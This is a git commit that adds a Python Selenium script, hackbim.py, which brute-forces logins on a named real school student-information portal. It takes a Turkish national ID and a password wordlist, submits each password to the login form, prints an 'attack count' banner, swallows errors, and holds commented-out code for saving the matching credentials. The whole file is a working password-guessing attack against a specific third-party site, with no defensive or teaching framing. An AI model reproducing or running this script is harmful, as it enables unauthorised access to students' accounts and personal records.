26ba4effdfa9259757e3fdf9d129142c72137053
rootebby <55960000+rootebby@users.noreply.github.com>
2020-09-15 23:26:14 +0300

    Add files via upload

---
+++ hackbim.py
@@ -0,0 +1,53 @@
+from selenium import webdriver
+import time
+
+username = input("TC : ")
+wordlist = input("Wordlist Path : ")
+
+
+
+browser = webdriver.Firefox()
+
+url = "http://obs.finalokullari.com.tr/"
+
+browser.get(url)
+time.sleep(2)
+
+usr_username = browser.find_element_by_xpath('//*[@id="username"]')
+usr_password = browser.find_element_by_xpath('//*[@id="password"]')
+usr_giris    = browser.find_element_by_xpath('/html/body/div[2]/div[1]/section/div/div/div[2]/div/div[2]/div/div[1]/div[2]/form/div[4]/button')
+
+say = 1
+with open(wordlist,"r",encoding="UTF-8") as wlist:
+	while True:
+		for word in wlist :
+			try:
+				usr_username.clear()
+				usr_password.clear()
+
+				usr_username.send_keys(username)
+				usr_password.send_keys(word)
+				
+				
+				usr_giris.click()
+				print("""
+*************************
+ coded by root@ebby:~# 
+*************************
+ Atak Sayısı     ==>> {}   
+*************************
+ Denenilen Şifre ==>> {}   
+*************************  
+				""".format(say,word))				
+				say += 1
+				
+				time.sleep(0.1)
+			except:
+				
+				pass
+				#print("Easyy !!")
+				#with open("script.txt","w",encoding="UTF-8") as script:
+					#script.write(str("TC : ") + str(username) + str("\n") +  str("Şifre : ") + str(word))
+		
+			
+
